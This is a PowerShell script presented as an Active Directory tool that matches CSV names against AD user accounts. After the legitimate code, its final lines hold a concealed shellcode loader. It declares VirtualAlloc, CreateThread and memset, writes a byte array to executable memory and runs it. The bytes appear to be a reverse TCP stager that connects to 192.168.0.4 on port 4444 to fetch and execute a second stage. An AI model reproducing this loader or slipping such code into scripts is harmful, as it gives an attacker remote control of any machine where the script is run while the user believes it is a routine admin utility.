
[CmdletBinding(DefaultParameterSetName = 'CSV')]
[OutputType('System.Management.Automation.PSCustomObject')]
param (
	[hashtable]$AdToSourceFieldMappings = @{ 'givenName' = 'FirstName'; 'Initials' = 'MiddleInitial'; 'surName' = 'LastName' },
	[hashtable]$AdToOutputFieldMappings = @{ 'givenName' = 'AD First Name'; 'Initials' = 'AD Middle Initial'; 'surName' = 'AD Last Name'; 'samAccountName' = 'AD Username' },
	[ValidateScript({Test-Path -Path $_ -PathType 'Leaf'})]
	[Parameter(Mandatory, ParameterSetName = 'CSV')]
	[ValidateScript({Test-Path -Path $_ -PathType 'Leaf' })]
	[string]$CsvFilePath
)

begin {
	$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop
	Set-StrictMode -Version Latest
	try {
		
		function Test-MatchFirstNameLastName ($FirstName, $LastName) {
			if ($FirstName -and $LastName) {
				Write-Verbose -Message "$($MyInvocation.MyCommand) - Searching for AD user match based on first name '$FirstName', last name '$LastName'"
				$Match = $AdUsers | where { ($_.givenName -eq $FirstName) -and ($_.surName -eq $LastName) }
				if ($Match) {
					Write-Verbose "$($MyInvocation.MyCommand) - Match(es) found!"
					$Match
				} else {
					Write-Verbose "$($MyInvocation.MyCommand) - Match not found"
					$false	
				}
			} else {
				Write-Verbose "$($MyInvocation.MyCommand) - Match not found. Either first or last name is null"
				$false
			}
		}
	
		function Test-MatchFirstNameMiddleInitialLastName ($FirstName, $MiddleInitial, $LastName) {
			if ($FirstName -and $LastName -and $MiddleInitial) {
				Write-Verbose -Message "$($MyInvocation.MyCommand) - Searching for AD user match based on first name '$FirstName', middle initial '$MiddleInitial' and last name '$LastName'"
				$Match = $AdUsers | where { ($_.givenName -eq $FirstName) -and ($_.surName -eq $LastName) -and (($_.Initials -eq $MiddleInitial) -or ($_.Initials -eq "$MiddleInitial.")) }
				if ($Match) {
					Write-Verbose "$($MyInvocation.MyCommand) - Match(es) found!"
					$Match
				} else {
					Write-Verbose "$($MyInvocation.MyCommand) - Match not found"
					$false
				}
			} else {
				Write-Verbose "$($MyInvocation.MyCommand) - Match not found. Either first name, middle initial or last name is null"
				$false
			}
		}
		
		function Test-MatchFirstInitialLastName ($FirstName,$LastName) {
			Write-Verbose -Message "$($MyInvocation.MyCommand) - Searching for AD user match based on first initial '$($FirstName.Substring(0,1))' and last name '$LastName'"
			if ($FirstName -and $LastName) {
				$Match = $AdUsers | where { "$($FirstName.SubString(0, 1))$LastName" -eq $_.samAccountName }
				if ($Match) {
					Write-Verbose "$($MyInvocation.MyCommand) - Match(es) found!"
					$Match
				} else {
					Write-Verbose "$($MyInvocation.MyCommand) - Match not found"
					$false
				}
			} else {
				Write-Verbose "$($MyInvocation.MyCommand) - Match not found. Either first name or last name is null"
				$false
			}
		}
		
		
		
		
		
		
		
		
		
		function Test-CsvField {
			$CsvHeaders = (Get-Content $CsvFilePath | Select-Object -First 1).Split(',').Trim('"')
			$AdToSourceFieldMappings.Values | foreach {
				if (!($CsvHeaders -like $_)) {
					return $false
				}
			}
			$true
		}
		
		
		
		function Get-LevenshteinDistance {
			
			
			
			
			
			
			
			
			
			
			
			param ([string] $first, [string] $second, [switch] $ignoreCase)
			
			
			
			
			
			
			$len1 = $first.length
			$len2 = $second.length
			
			
			
			
			if ($len1 -eq 0) { return $len2 }
			
			if ($len2 -eq 0) { return $len1 }
			
			
			if ($ignoreCase -eq $true) {
				$first = $first.tolowerinvariant()
				$second = $second.tolowerinvariant()
			}
			
			
			$dist = new-object -type 'int[,]' -arg ($len1 + 1), ($len2 + 1)
			
			
			
			for ($i = 0; $i -le $len1; $i++) { $dist[$i, 0] = $i }
			for ($j = 0; $j -le $len2; $j++) { $dist[0, $j] = $j }
			
			$cost = 0
			
			for ($i = 1; $i -le $len1; $i++) {
				for ($j = 1; $j -le $len2; $j++) {
					if ($second[$j - 1] -ceq $first[$i - 1]) {
						$cost = 0
					} else {
						$cost = 1
					}
					
					
					
					
					
					
					
					
					$tempmin = [System.Math]::Min(([int]$dist[($i - 1), $j] + 1), ([int]$dist[$i, ($j - 1)] + 1))
					$dist[$i, $j] = [System.Math]::Min($tempmin, ([int]$dist[($i - 1), ($j - 1)] + $cost))
				}
			}
			
			
			return $dist[$len1, $len2];
		}
		
		
		
		function New-OutputRow ([object]$SourceRowData) {
			$OutputRow = [ordered]@{
				'Match' = $false;
				'MatchTest' = 'N/A'
			}
			$AdToOutputFieldMappings.Values | foreach {
				$OutputRow[$_] = 'N/A'
			}
			
			$SourceRowData.psobject.Properties | foreach {
				if ($_.Value) {
					$OutputRow[$_.Name] = $_.Value
				}
			}
			$OutputRow
		}
		
		function Add-ToOutputRow ([hashtable]$OutputRow, [object]$AdRowData, $MatchTest) {
			$AdToOutputFieldMappings.Keys | foreach {
				if ($AdRowData.$_) {
					$OutputRow[$AdToOutputFieldMappings[$_]] = $AdRowData.$_
				}
				$OutputRow.MatchTest = $MatchTest
			}
			$OutputRow
		}
		
		function Test-TestMatchValid ($FunctionParameters) {
			$Compare = Compare-Object -ReferenceObject $FunctionParameters -DifferenceObject ($AdToSourceFieldMappings.Values | % { $_ }) -IncludeEqual -ExcludeDifferent
			if (!$Compare) {
				$false
			} elseif ($Compare.Count -ne $FunctionParameters.Count) {
				$false
			} else {
				$true	
			}
		}
		
		function Get-FunctionParams ($Function) {
			$Function.Parameters.Keys | where { $AdToSourceFieldMappings.Values -contains $_ }
		}
		
		
		
		
		
		
		$MatchFunctionPriorities = @{
			'Test-MatchFirstNameMiddleInitialLastName' = 1
			'Test-MatchFirstNameLastName' = 2
			
			'Test-MatchFirstInitialLastName' = 4
		}
		
		if ($PSBoundParameters.CsvFilePath) {
			Write-Verbose -Message "Verifying all field names in the $CsvFilePath match $($AdToSourceFieldMappings.Values -join ',')"
			if (!(Test-CsvField)) {
				throw "One or more fields specified in the `$AdToSourceFieldMappings param do not exist in the CSV file $CsvFilePath"
			} else {
				Write-Verbose "The CSV file's field match source field mappings"
			}
		}
		
	} catch {
		Write-Error "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
		return
	}
	
	Write-Verbose -Message "Retrieving all Active Directory user objects..."
	$script:AdUsers = Get-ADUser -Filter * -Properties 'DisplayName','Initials'
}

process {
	try {
		
		
		
		$TestFunctions = Get-ChildItem function:\Test-Match* | where { !$_.Module }
		Write-Verbose "Found $($TestFunctions.Count) test functions in the script"
		$MatchTestsToRun = @()
		foreach ($TestFunction in $TestFunctions) {
			Write-Verbose -Message "Checking to see if we'll use the $($TestFunction.Name) function"
			if (Test-TestMatchValid -FunctionParameters ($TestFunction.Parameters.Keys | % { $_ })) {
				Write-Verbose -Message "The source data has all of the function $($TestFunction.Name)'s parameters. We'll try this one"
				$MatchTestsToRun += [System.Management.Automation.FunctionInfo]$TestFunction
			} else {
				Write-Verbose -Message "The parameters $($AdToSourceFieldMappings.Keys -join ',') are not adequate for the function $($TestFunction.Name)"
			}
		}
		
		
		
		$MatchTestsToRun | foreach {
			$Test = $_;
			foreach ($i in $MatchFunctionPriorities.GetEnumerator()) {
				if ($Test.Name -eq $i.Key) {
					Write-Verbose "Assigning a priority of $($i.Value) to function $($Test.Name)"
					$Test | Add-Member -NotePropertyName 'Priority' -NotePropertyValue $i.Value
				}
			}
		}
		$MatchTestsToRun = $MatchTestsToRun | Sort-Object Priority
		
		if ($CsvFilePath) {
			$DataRows = Import-Csv -Path $CsvFilePath	
		}
		
		
		
		foreach ($Row in $DataRows) {
			
				[hashtable]$OutputRow = New-OutputRow -SourceRowData $Row
				
				
				
				
				foreach ($Test in $MatchTestsToRun) {
					Write-Verbose -Message "Running function $($Test.Name)..."
					[array]$FuncParamKeys = Get-FunctionParams -Function $Test
					[hashtable]$FuncParams = @{ }
					[array]$FuncParamKeys | foreach {
						$Row.psObject.Properties | foreach {
							if ([array]$FuncParamKeys -contains [string]$_.Name) {
								$FuncParams[$_.Name] = $_.Value
							}
						}
					}
					Write-Verbose -Message "Passing the parameters '$($FuncParams.Keys -join ',')' with values '$($FuncParams.Values -join ',')' to the function $($Test.Name)"
					$AdTestResultObject = & $Test @FuncParams
					if ($AdTestResultObject) {
						$OutputRow.Match = $true
						foreach ($i in $AdTestResultObject) {
							$OutputRow = Add-ToOutputRow -AdRowData $i -OutputRow $OutputRow -MatchTest $Test.Name
						}
						break
					}
				}
			
			[pscustomobject]$OutputRow
		}
	} catch {
		Write-Error "Error: $($_.Exception.Message) - Line Number: $($_.InvocationInfo.ScriptLineNumber)"
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x04,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

